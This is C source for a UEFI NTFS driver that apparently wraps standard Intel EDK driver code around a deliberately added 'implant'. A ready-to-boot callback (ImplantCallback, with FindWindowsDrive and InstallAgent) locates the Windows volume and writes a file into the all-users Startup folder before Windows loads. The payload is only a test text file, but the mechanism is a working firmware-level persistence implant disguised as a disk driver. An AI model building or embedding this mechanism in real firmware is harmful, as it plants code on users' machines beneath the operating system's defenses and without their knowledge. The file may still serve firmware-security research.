/*++

Copyright (c) 2005 - 2010, Intel Corporation. All rights reserved.<BR>
This program and the accompanying materials
are licensed and made available under the terms and conditions of the Software
License Agreement which accompanies this distribution.


Module Name:

  Ntfs.c

Abstract:

  NTFS File System driver routines that support EFI driver model
  plus implanted callback that writes a file to the Windows startup folder.

--*/

#include "Ntfs.h"


EFI_STATUS
EFIAPI
NtfsEntryPoint (
  IN EFI_HANDLE         ImageHandle,
  IN EFI_SYSTEM_TABLE   *SystemTable
  );

EFI_STATUS
EFIAPI
NtfsUnload (
  IN EFI_HANDLE         ImageHandle
  );

EFI_STATUS
EFIAPI
NtfsDriverBindingSupported (
  IN EFI_DRIVER_BINDING_PROTOCOL  *This,
  IN EFI_HANDLE                   Controller,
  IN EFI_DEVICE_PATH_PROTOCOL     *RemainingDevicePath
  );

EFI_STATUS
EFIAPI
NtfsDriverBindingStart (
  IN EFI_DRIVER_BINDING_PROTOCOL  *This,
  IN EFI_HANDLE                   Controller,
  IN EFI_DEVICE_PATH_PROTOCOL     *RemainingDevicePath
  );

EFI_STATUS
EFIAPI
NtfsDriverBindingStop (
  IN  EFI_DRIVER_BINDING_PROTOCOL  *This,
  IN  EFI_HANDLE                   Controller,
  IN  UINTN                        NumberOfChildren,
  IN  EFI_HANDLE                   *ChildHandleBuffer
  );

//
// DriverBinding protocol instance
//
EFI_DRIVER_BINDING_PROTOCOL gNtfsDriverBinding = {
  NtfsDriverBindingSupported,
  NtfsDriverBindingStart,
  NtfsDriverBindingStop,
  0xa,
  NULL,
  NULL
};

//
// Flag to "debounce" ImplantCallback  
//
BOOLEAN gRanAlready;


/*
ConnectDiskControllers() ensures this NTFS driver is connected to any NTFS 
device controllers. In my tests, this step seems unnecessary, 
but it demonstrates useful concepts.
*/
EFI_STATUS
EFIAPI
ConnectDiskControllers(
  VOID
  )
{
  EFI_STATUS    Status = EFI_SUCCESS;
  UINTN         Index = 0, Index2 = 0;
  EFI_HANDLE    *DiskIoDeviceHandleBuffer = NULL;
  UINTN         DiskIoDeviceHandleCount = 0;
  EFI_HANDLE    *BlockIoDeviceHandleBuffer = NULL;
  UINTN         BlockIoDeviceHandleCount = 0;
  
  Status = gBS->LocateHandleBuffer(ByProtocol, &gEfiBlockIoProtocolGuid, NULL, &BlockIoDeviceHandleCount, &BlockIoDeviceHandleBuffer);
  if (EFI_ERROR(Status)) {
	goto done;
  }  
  
  Status = gBS->LocateHandleBuffer(ByProtocol, &gEfiDiskIoProtocolGuid, NULL, &DiskIoDeviceHandleCount, &DiskIoDeviceHandleBuffer);
  if (EFI_ERROR(Status)) {
	goto done;
  }
  
  for (Index = 0; Index < DiskIoDeviceHandleCount; Index++) {
    for (Index2 = 0; Index2 < BlockIoDeviceHandleCount; Index2++) {
      if (BlockIoDeviceHandleBuffer[Index] == DiskIoDeviceHandleBuffer[Index2])
      {
        Status = gBS->ConnectController(BlockIoDeviceHandleBuffer[Index], NULL, NULL, FALSE);
		// Check Status
      }
    }
  }

done:
  if (NULL != BlockIoDeviceHandleBuffer) { gBS->FreePool(BlockIoDeviceHandleBuffer); }
  if (NULL != DiskIoDeviceHandleBuffer) { gBS->FreePool(DiskIoDeviceHandleBuffer); }
  return Status;
}


/*
FindWindowsDrive() looks for a drive that contains a Windows installation 
and returns a pointer to its root directory.
*/
EFI_STATUS
EFIAPI
FindWindowsDrive(
  IN EFI_HANDLE                     ImageHandle, 
  OUT EFI_FILE_PROTOCOL             **RootDir
  )
{
  EFI_STATUS                        Status = EFI_SUCCESS;
  UINTN                             Index = 0;
  EFI_HANDLE                        *FileSystemHandleBuffer = NULL;
  UINTN                             FileSystemHandleCount = 0;
  EFI_SIMPLE_FILE_SYSTEM_PROTOCOL   *FileSystemProtocol = NULL;
  EFI_FILE_PROTOCOL                 *WindowsDir = NULL;

  Status = gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &FileSystemHandleCount, &FileSystemHandleBuffer);
  if (EFI_ERROR(Status)) {
    goto done;
  }

  for (Index = 0 ; Index < FileSystemHandleCount ; Index++) 
  {
    Status = gBS->OpenProtocol(FileSystemHandleBuffer[Index], &gEfiSimpleFileSystemProtocolGuid, (void **)&FileSystemProtocol, ImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL);
    if (EFI_ERROR(Status)) { continue; }
    
    Status = FileSystemProtocol->OpenVolume(FileSystemProtocol, RootDir);
    if (EFI_ERROR(Status)) { continue; }
    
    Status = (*RootDir)->Open((*RootDir), &WindowsDir, L".\\Windows", EFI_FILE_MODE_READ, 0);
    if (EFI_ERROR(Status)) { continue; }
	
    Print(L"Found Windows dir\n");
    WindowsDir->Close(WindowsDir);
	break;
  }

done:
  if (NULL != FileSystemHandleBuffer) { gBS->FreePool(FileSystemHandleBuffer); }
  return Status;
}

/*
WriteTestFile() writes a test file to a given directory.
*/
EFI_STATUS
EFIAPI
WriteTestFile(
  IN EFI_FILE_PROTOCOL  *Dir
  )
{
  EFI_STATUS            Status = EFI_SUCCESS;
  EFI_FILE_PROTOCOL     *File = NULL;
  CHAR16                FileName[] = L"test.txt";
  CHAR8                 FileBody[] = "This is a test file.\n";
  UINTN                 FileLength = 21;

  Status = Dir->Open(Dir, &File, FileName, EFI_FILE_MODE_READ|EFI_FILE_MODE_WRITE|EFI_FILE_MODE_CREATE, 0);
  if (!(EFI_ERROR(Status)))
  {
    Status = File->Write(File, &FileLength, FileBody);
    if (!(EFI_ERROR(Status)))
    {
      Print(L"Wrote test file\n");
      File->Close(File);
    }
  }

  return Status;
}

/*
InstallAgent() writes a file to Windows startup folder, 
given a pointer to the file system root. It uses the File protocol interface 
of the root to open the startup folder, then passes the File protocol interface 
of the startup folder to WriteTestFile(). 
*/
EFI_STATUS
EFIAPI
InstallAgent(
  IN EFI_FILE_PROTOCOL   *RootDir
  )
{
  EFI_STATUS             Status = EFI_SUCCESS;
  EFI_FILE_PROTOCOL      *StartupDir = NULL;
  CHAR16                 StartupPath[] = L"\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
  
  Status = RootDir->Open(RootDir, &StartupDir, StartupPath, EFI_FILE_MODE_READ, 0);
  if (!(EFI_ERROR(Status)))
  {  
    Status = WriteTestFile(StartupDir);
    StartupDir->Close(StartupDir);
  }

  return Status;  
}


/*
ImplantCallback() is the core of the driver implant. 
It makes sure the NTFS driver is connected to any controllers for disks 
with NTFS volumes, looks for a Windows file system, and installs an agent 
in the Windows startup folder.
*/
VOID
EFIAPI
ImplantCallback (
  IN EFI_EVENT         Event,
  IN VOID              *Context // ImageHandle
  )
{
  EFI_STATUS           Status = EFI_SUCCESS;
  EFI_HANDLE           ImageHandle = Context;
  EFI_FILE_PROTOCOL    *RootDir = NULL;

  if (TRUE == gRanAlready)
  {
    goto done;
  }

  ConnectDiskControllers();
  
  Status = FindWindowsDrive(ImageHandle, &RootDir);
  if (EFI_ERROR(Status))
  {
    Print(L"ERROR - FindWindowsDrive: %r\n", Status);
  }
  else
  {
    Status = InstallAgent(RootDir);
	Print(L"InstallAgent: %r\n", Status);
  }

  RootDir->Close(RootDir);

  gRanAlready = TRUE;

done:
  return;
  
}

/*
NtfsEntryPoint() initializes the NTFS driver 
and registers a callback for the ready-to-boot event.
*/
EFI_STATUS
EFIAPI
NtfsEntryPoint (
  IN EFI_HANDLE         ImageHandle,
  IN EFI_SYSTEM_TABLE   *SystemTable
  )
/*++

Routine Description:

  Register Driver Binding protocol for this driver.

Arguments:

  ImageHandle           - Handle for the image of this driver.
  SystemTable           - Pointer to the EFI System Table.

Returns:

  EFI_SUCCESS           - Driver loaded.
  other                 - Driver not loaded.

--*/
{
  EFI_STATUS                Status;
  EFI_EVENT                 Event;

DEBUG ((EFI_D_INIT, "NtfsEntryPoint:", Status));

  Status = EFI_SUCCESS;

  //
  // Initialize the EFI Driver Library
  //
  Status = EfiLibInstallDriverBindingComponentName2 (
             ImageHandle,
             SystemTable,
             &gNtfsDriverBinding,
             ImageHandle,
             &gNtfsComponentName,
             &gNtfsComponentName2
             );
  ASSERT_EFI_ERROR (Status);

  Status = gBS->CreateEventEx (
            EVT_NOTIFY_SIGNAL,
            TPL_CALLBACK,
            ImplantCallback,
            ImageHandle, // Pass image handle as context to use later
            &gEfiEventReadyToBootGuid,
            &Event
            ); 
  ASSERT_EFI_ERROR (Status);
  
  gRanAlready = FALSE; // Callback debouncing flag
 
    
  return Status;
}

EFI_STATUS
EFIAPI
NtfsUnload (
  IN EFI_HANDLE  ImageHandle
  )
/*++

Routine Description:

  Unload function for this image. Uninstall DriverBinding protocol.

Arguments:

  ImageHandle           - Handle for the image of this driver.

Returns:

  EFI_SUCCESS           - Driver unloaded successfully.
  other                 - Driver can not unloaded.

--*/
{
  EFI_STATUS  Status;
  EFI_HANDLE  *DeviceHandleBuffer;
  UINTN       DeviceHandleCount;
  UINTN       Index;

  Status = gBS->LocateHandleBuffer (
                  AllHandles,
                  NULL,
                  NULL,
                  &DeviceHandleCount,
                  &DeviceHandleBuffer
                  );
  if (!EFI_ERROR (Status)) {
    for (Index = 0; Index < DeviceHandleCount; Index++) {
      Status = gBS->DisconnectController (
                      DeviceHandleBuffer[Index],
                      ImageHandle,
                      NULL
                      );
    }

    if (DeviceHandleBuffer != NULL) {
      FreePool (DeviceHandleBuffer);
    }
  }

  return Status;
}

EFI_STATUS
EFIAPI
NtfsDriverBindingSupported (
  IN EFI_DRIVER_BINDING_PROTOCOL  *This,
  IN EFI_HANDLE                   ControllerHandle,
  IN EFI_DEVICE_PATH_PROTOCOL     *RemainingDevicePath
  )
/*++

Routine Description:

  Test to see if this driver can add a file system to ControllerHandle.
  ControllerHandle must support both Disk IO and Block IO protocols.

Arguments:

  This                  - Protocol instance pointer.
  ControllerHandle      - Handle of device to test.
  RemainingDevicePath   - Not used.

Returns:

  EFI_SUCCESS           - This driver supports this device.
  EFI_ALREADY_STARTED   - This driver is already running on this device.
  other                 - This driver does not support this device.

--*/
{
  EFI_STATUS            Status;
  EFI_DISK_IO_PROTOCOL  *DiskIo;

  //CpuBreakpoint();

  //
  // Open the IO Abstraction(s) needed to perform the supported test
  //
  Status = gBS->OpenProtocol (
                  ControllerHandle,
                  &gEfiDiskIoProtocolGuid,
                  (VOID **) &DiskIo,
                  This->DriverBindingHandle,
                  ControllerHandle,
                  EFI_OPEN_PROTOCOL_BY_DRIVER
                  );

  if (EFI_ERROR (Status)) {
    return Status;
  }
  //
  // Close the I/O Abstraction(s) used to perform the supported test
  //
  gBS->CloseProtocol (
         ControllerHandle,
         &gEfiDiskIoProtocolGuid,
         This->DriverBindingHandle,
         ControllerHandle
         );

  //
  // Open the IO Abstraction(s) needed to perform the supported test
  //
  Status = gBS->OpenProtocol (
                  ControllerHandle,
                  &gEfiBlockIoProtocolGuid,
                  NULL,
                  This->DriverBindingHandle,
                  ControllerHandle,
                  EFI_OPEN_PROTOCOL_TEST_PROTOCOL
                  );

  return Status;
}

EFI_STATUS
EFIAPI
NtfsDriverBindingStart (
  IN EFI_DRIVER_BINDING_PROTOCOL  *This,
  IN EFI_HANDLE                   ControllerHandle,
  IN EFI_DEVICE_PATH_PROTOCOL     *RemainingDevicePath
  )
/*++

Routine Description:

  Start this driver on ControllerHandle by opening a Block IO and Disk IO
  protocol, reading Device Path. Add a Simple File System protocol to
  ControllerHandle if the media contains a valid file system.

Arguments:

  This                  - Protocol instance pointer.
  ControllerHandle      - Handle of device to bind driver to.
  RemainingDevicePath   - Not used.

Returns:

  EFI_SUCCESS           - This driver is added to DeviceHandle.
  EFI_ALREADY_STARTED   - This driver is already running on DeviceHandle.
  EFI_OUT_OF_RESOURCES  - Can not allocate the memory.
  other                 - This driver does not support this device.

--*/
{
  EFI_STATUS            Status;
  EFI_BLOCK_IO_PROTOCOL *BlockIo;
  EFI_DISK_IO_PROTOCOL  *DiskIo;
  BOOLEAN               LockedByMe;

  LockedByMe = FALSE;
  //
  // Acquire the lock.
  // If caller has already acquired the lock, cannot lock it again.
  //
  Status = NtfsAcquireLockOrFail ();
  if (!EFI_ERROR (Status)) {
    LockedByMe = TRUE;
  }

  Status = InitializeUnicodeCollationSupport (This->DriverBindingHandle);
  if (EFI_ERROR (Status)) {
    goto Exit;
  }
  //
  // Open our required BlockIo and DiskIo
  //
  Status = gBS->OpenProtocol (
                  ControllerHandle,
                  &gEfiBlockIoProtocolGuid,
                  (VOID **) &BlockIo,
                  This->DriverBindingHandle,
                  ControllerHandle,
                  EFI_OPEN_PROTOCOL_GET_PROTOCOL
                  );
  if (EFI_ERROR (Status)) {
    goto Exit;
  }

  Status = gBS->OpenProtocol (
                  ControllerHandle,
                  &gEfiDiskIoProtocolGuid,
                  (VOID **) &DiskIo,
                  This->DriverBindingHandle,
                  ControllerHandle,
                  EFI_OPEN_PROTOCOL_BY_DRIVER
                  );
  if (EFI_ERROR (Status)) {
    goto Exit;
  }
  //
  // Allocate Volume structure. In NtfsAllocateVolume(), Resources
  // are allocated with protocol installed and cached initialized
  //
  Status = NtfsAllocateVolume (ControllerHandle, DiskIo, BlockIo);

  //
  // When the media changes on a device it will Reinstall the BlockIo interaface.
  // This will cause a call to our Stop(), and a subsequent reentrant call to our
  // Start() successfully. We should leave the device open when this happen.
  //
  if (EFI_ERROR (Status)) {
    Status = gBS->OpenProtocol (
                    ControllerHandle,
                    &gEfiSimpleFileSystemProtocolGuid,
                    NULL,
                    This->DriverBindingHandle,
                    ControllerHandle,
                    EFI_OPEN_PROTOCOL_TEST_PROTOCOL
                    );
    if (EFI_ERROR (Status)) {
      gBS->CloseProtocol (
             ControllerHandle,
             &gEfiDiskIoProtocolGuid,
             This->DriverBindingHandle,
             ControllerHandle
             );
    }
  }

Exit:
  //
  // Unlock if locked by myself.
  //
  if (LockedByMe) {
    NtfsReleaseLock ();
  }
  return Status;
}

EFI_STATUS
EFIAPI
NtfsDriverBindingStop (
  IN  EFI_DRIVER_BINDING_PROTOCOL   *This,
  IN  EFI_HANDLE                    ControllerHandle,
  IN  UINTN                         NumberOfChildren,
  IN  EFI_HANDLE                    *ChildHandleBuffer
  )
/*++

Routine Description:
  Stop this driver on ControllerHandle.

Arguments:
  This                  - Protocol instance pointer.
  ControllerHandle      - Handle of device to stop driver on.
  NumberOfChildren      - Not used.
  ChildHandleBuffer     - Not used.

Returns:
  EFI_SUCCESS           - This driver is removed DeviceHandle.
  other                 - This driver was not removed from this device.

--*/
{
  EFI_STATUS                      Status;
  EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem;
  NTFS_VOLUME                      *Volume;

  //
  // Get our context back
  //
  Status = gBS->OpenProtocol (
                  ControllerHandle,
                  &gEfiSimpleFileSystemProtocolGuid,
                  (VOID **) &FileSystem,
                  This->DriverBindingHandle,
                  ControllerHandle,
                  EFI_OPEN_PROTOCOL_GET_PROTOCOL
                  );

  if (!EFI_ERROR (Status)) {
    Volume = VOLUME_FROM_VOL_INTERFACE (FileSystem);
    Status = NtfsAbandonVolume (Volume);
    if (EFI_ERROR (Status)) {
      return Status;
    }
  }

  Status = gBS->CloseProtocol (
                  ControllerHandle,
                  &gEfiDiskIoProtocolGuid,
                  This->DriverBindingHandle,
                  ControllerHandle
                  );

  return Status;
}
